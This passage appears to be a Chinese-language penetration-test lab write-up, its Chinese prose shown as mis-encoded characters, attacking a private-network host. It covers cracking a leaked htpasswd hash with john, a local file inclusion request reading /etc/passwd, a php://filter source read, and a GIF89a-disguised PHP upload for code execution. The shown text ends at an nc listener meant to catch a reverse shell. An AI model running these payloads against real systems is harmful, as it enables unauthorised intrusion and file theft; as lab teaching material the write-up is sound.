srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ²¡æœ‰æœ‰æ•ˆçš„ä¿¡æ¯ï¼Œdevelopmentå¤„éœ€è¦ç™»å½•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100304688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100304688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”¨å¾¡å‰‘æ‰«å‡ºäº†ç›®æ ‡å­˜åœ¨index.html.bakï¼Œä¸‹è½½ä¸‹æ¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100635084.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100635084.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>bakä¸ºå¦‚ä¸‹æ–‡ä»¶ï¼Œ<code>frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0</code>ä¼¼ä¹å°±æ˜¯ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is the default web page for this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The web server software is running but no content has been added, yet.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/development&quot;</span>&gt;</span>development<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ª1.txtï¼ŒæŠŠ<code>frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0</code>å†™è¿›1.txtï¼Œç”¨johnå·¥å…·è§£å¯†ï¼Œè§£å¯†å‡ºå¯†ç ä¸ºfrank!!!</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101149865.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101149865.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ­¤æ—¶å†å»developmentç™»å½•ï¼Œç™»å½•æˆåŠŸï¼Œæ˜¾ç¤ºä»¥ä¸‹ç•Œé¢ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101350050.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101350050.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æç¤ºå…·æœ‰æ–‡ä»¶ä¸Šä¼ æ¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101500282.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101500282.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†æ‰«ä¸€éå‘ç°uploaderç›®å½•ï¼Œåç»­å°±æ˜¯æƒ³åŠæ³•æ–‡ä»¶ä¸Šä¼ è¿›åå°äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101449725.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101449725.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨exploit-dbä¸Šæœç´¢sshå¯¹åº”ç‰ˆæœ¬çš„æ¼æ´ï¼Œæˆ–è€…searchspolitï¼Œç›®æ ‡æœåŠ¡å™¨çš„opensshæœ‰ç”¨æˆ·åæšä¸¾æ¼æ´</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>seebugä¸Šçœ‹åˆ°ç›®æ ‡ä¸»æœºå­˜åœ¨ä¿¡æ¯æ³„éœ²å’Œç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿˜æœ‰2010å¹´çš„æ‹’ç»æœåŠ¡æ¼æ´ï¼ˆå› è¯¥æ¼æ´ç­‰çº§è¾ƒä½ï¼Œå®æ–½æ‹’ç»æœåŠ¡ä¹Ÿè¾ƒå›°éš¾æ‰€ä»¥æ— è§†ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>&#x3D;&#x3D;192.168.101.133ä¸»æœºçš„22ç«¯å£å­˜åœ¨ä¿¡æ¯æ³„éœ²å’Œç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œseebugè¿˜æœ‰searchspolitéƒ½èƒ½æ‰¾åˆ°å¯¹åº”çš„pocï¼Œè¯¥è½®ä¿¡æ¯æ‰«æå¯ä»¥ç”¨æ¥è¿›è¡Œä¸‹ä¸€æ­¥çš„sshçˆ†ç ´æˆ–æº¢å‡ºæ¼æ´æ”»å‡»ã€‚è¯¥ä¿¡æ¯æ³„éœ²æ¼æ´ä¹Ÿå®šä¹‰ä¸ºä¸­å±ã€‚&#x3D;&#x3D;</p><p>&#x3D;&#x3D;åŒæ—¶ï¼Œè¯¥ä¸»æœºwebæœåŠ¡ç›®å½•æ‰«æå‡ºdevelopmentç›®å½•å’Œindex.html.bakå¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œæ–‡ä»¶è§£å¯†åå¯ä»¥è·å¾—åå°ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿›è€Œç»§ç»­æ–‡ä»¶ä¸Šä¼ æ”»å‡»ã€‚ç”±äºæ”»å‡»å¤æ‚æ€§å’Œåç»­å±å®³æ€§æœªçŸ¥ï¼Œä½†æ˜¯çˆ†ç ´å¯†ç æˆåŠŸï¼Œå®šä¹‰ä¸ºä¸­å±&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ï¼ˆ2ï¼‰æ–‡ä»¶ä¸Šä¼ åŠapiè·å–shell"><a href="#ï¼ˆ2ï¼‰æ–‡ä»¶ä¸Šä¼ åŠapiè·å–shell" class="headerlink" title="ï¼ˆ2ï¼‰æ–‡ä»¶ä¸Šä¼ åŠapiè·å–shell"></a>ï¼ˆ2ï¼‰æ–‡ä»¶ä¸Šä¼ åŠapiè·å–shell</h3><p>è®¿é—®192.168.101.133&#x2F;development&#x2F;uploader&#x2F;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626165850566.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626165850566.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File is not an image.Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.Sorry, your file was not uploaded. </span><br></pre></td></tr></table></figure><p>ä¸ŠBPå‘ç°PHPæ€ä¹ˆéƒ½ä¼ ä¸ä¸Šã€‚</p><p>å…ˆæ”¾å¼ƒæ–‡ä»¶ä¸Šä¼ </p><h4 id="api"><a href="#api" class="headerlink" title="api"></a>api</h4><p>è®¿é—®192.168.101.133:8011ä¹Ÿå°±æ˜¯å¦ä¸€ä¸ªwebç«¯å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170634258.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170634258.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®å½•æ‰«æï¼Œä¸Šdirbï¼šå‘ç°&#x2F;api&#x2F;ç›®å½•ï¼Œè¯¥8011ç«¯å£æ˜¯å¯¹80ç«¯å£webæœåŠ¡æä¾›çš„ä¸€äº›api</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170800999.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170800999.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯¹ä¸‹åˆ—å››ä¸ªapié€ä¸ªè®¿é—®ï¼Œå‘ç°åªæœ‰files_api.phpå¯ç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170836976.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170836976.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æç¤ºéœ€è¦ä¼ é€’fileçš„å‚æ•°ï¼Œå¹¶ä¸”è¯¥apiä¸ä½¿ç”¨jsonï¼Œä»¥åŸå§‹æ ¼å¼å‘é€æ–‡ä»¶å</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171114731.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171114731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>çŒœæµ‹è¯¥apiä¸ºæ–‡ä»¶è®¿é—®çš„apiï¼ŒPOSTæ•°æ®ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/files_api.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.101.133:8011</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"></span><br><span class="line"><span class="language-gradle"><span class="keyword">file</span>=<span class="regexp">/etc/</span>passwd</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œå¿…é¡»è¦åŠ <code>Content-Type:application/w-www-form-urlencoded</code>è¡¨ç¤ºè¯·æ±‚ä½“ä¸­çš„æ•°æ®æ˜¯URLç¼–ç è¿‡çš„ï¼Œä¸ç„¶<code>=</code>ä¼šè§£æé”™è¯¯(çŒœçš„)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171820840.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171820840.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯»å–apachaçš„é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/etc/apache2/sites-enabled/000-default</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°developmentçš„è·¯å¾„åœ¨<code>/var/www/development</code>ï¼Œç›¸åº”çš„upload.phpå°±åœ¨<code>/var/www/development/uploader/upload.php</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626172128787.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626172128787.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›´æ¥è¯»å–upload.phpï¼Œå‘ç°ç›´æ¥æ‰§è¡Œäº†è¯¥æ–‡ä»¶ï¼Œé‚£å°±è¯•è¯•ä¼ªåè®®ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://<span class="built_in">filter</span>/read=convert.base64-encode/resource=/var/www/development/uploader/upload.php</span><br></pre></td></tr></table></figure><p>è¿”å›ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJHRhcmdldF9kaXIgPSAiRlJBTkt1cGxvYWRzLyI7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gYmFzZW5hbWUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSk7CiR1cGxvYWRPayA9IDE7CiRpbWFnZUZpbGVUeXBlID0gc3RydG9sb3dlcihwYXRoaW5mbygkdGFyZ2V0X2ZpbGUsUEFUSElORk9fRVhURU5TSU9OKSk7Ci8vIENoZWNrIGlmIGltYWdlIGZpbGUgaXMgYSBhY3R1YWwgaW1hZ2Ugb3IgZmFrZSBpbWFnZQppZihpc3NldCgkX1BPU1RbInN1Ym1pdCJdKSkgewogICAgJGNoZWNrID0gZ2V0aW1hZ2VzaXplKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJ0bXBfbmFtZSJdKTsKICAgIGlmKCRjaGVjayAhPT0gZmFsc2UpIHsKICAgICAgICBlY2hvICJGaWxlIGlzIGFuIGltYWdlIC0gIiAuICRjaGVja1sibWltZSJdIC4gIi4iOwogICAgICAgICR1cGxvYWRPayA9IDE7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIkZpbGUgaXMgbm90IGFuIGltYWdlLiI7CiAgICAgICAgJHVwbG9hZE9rID0gMDsKICAgIH0KfQovLyBDaGVjayBpZiBmaWxlIGFscmVhZHkgZXhpc3RzCmlmIChmaWxlX2V4aXN0cygkdGFyZ2V0X2ZpbGUpKSB7CiAgICBlY2hvICJTb3JyeSwgZmlsZSBhbHJlYWR5IGV4aXN0cy4iOwogICAgJHVwbG9hZE9rID0gMDsKfQovLyBDaGVjayBmaWxlIHNpemUKaWYgKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJzaXplIl0gPiA1MDAwMDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgaXMgdG9vIGxhcmdlLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIEFsbG93IGNlcnRhaW4gZmlsZSBmb3JtYXRzCmlmKCRpbWFnZUZpbGVUeXBlICE9ICJqcGciICYmICRpbWFnZUZpbGVUeXBlICE9ICJwbmciICYmICRpbWFnZUZpbGVUeXBlICE9ICJqcGVnIgomJiAkaW1hZ2VGaWxlVHlwZSAhPSAiZ2lmIiApIHsKICAgIGVjaG8gIlNvcnJ5LCBvbmx5IEpQRywgSlBFRywgUE5HICYgR0lGIGZpbGVzIGFyZSBhbGxvd2VkLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIENoZWNrIGlmICR1cGxvYWRPayBpcyBzZXQgdG8gMCBieSBhbiBlcnJvcgppZiAoJHVwbG9hZE9rID09IDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgd2FzIG5vdCB1cGxvYWRlZC4iOwovLyBpZiBldmVyeXRoaW5nIGlzIG9rLCB0cnkgdG8gdXBsb2FkIGZpbGUKfSBlbHNlIHsKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICAgICBlY2hvICJUaGUgZmlsZSAiLiBiYXNlbmFtZSggJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSkuICIgaGFzIGJlZW4gdXBsb2FkZWQgdG8gbXkgdXBsb2FkcyBwYXRoLiI7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIlNvcnJ5LCB0aGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHlvdXIgZmlsZS4iOwogICAgfQp9Cj8+Cgo=</span><br></pre></td></tr></table></figure><p>base64è§£ç åæºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;FRANKuploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$target_file</span>,PATHINFO_EXTENSION));</span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$check</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . <span class="variable">$check</span>[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if file already exists</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check file size</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Allow certain file formats</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;png&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;jpeg&quot;</span></span><br><span class="line">&amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;gif&quot;</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]). <span class="string">&quot; has been uploaded to my uploads path.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡å¯çŸ¥ä¸Šä¼ è·¯å¾„ï¼š<code>FRANKuploads/</code></p><p>åœ¨è®¿é—®upload.phpæ—¶å‘ç°ç›´æ¥æ‰§è¡Œäº†phpæ–‡ä»¶ï¼Œé‚£è¯•è¯•ä¸ä»¥phpåç¼€ä¼šä¸ä¼šè¢«å½“ä½œphpè§£æå…¶å†…å®¹ã€‚POSTå¦‚ä¸‹æ•°æ®ï¼Œæ–‡ä»¶åä¸º1.gifï¼ŒåŠ ä¸Šæ–‡ä»¶å¤´GIF89aï¼Œå†…å®¹ä¸ºphpinfo</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/development/uploader/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.101.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.101.133/development/uploader/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------322949819912746147301031583637</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>390</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.101.133</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic ZnJhbms6ZnJhbmshISE=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">322949819912746147301031583637</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;fileToUpload&quot;</span>; filename=<span class="string">&quot;1.gif&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">GIF89a</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">322949819912746147301031583637</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload Image</span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">322949819912746147301031583637</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>è®¿é—®è¯¥gifï¼šçœ‹åˆ°äº†phpinfoï¼Œè¯æ˜è¢«è§£æäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/var/www/development/uploader/FRANKuploads/1.gif</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626173407715.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626173407715.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>kaliå¼€ä¸ªncç›‘å¬</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><blockquote><p>ç”¨nvlpå‚æ•°æ²¡å¼¹å›æ¥ï¼Œå› 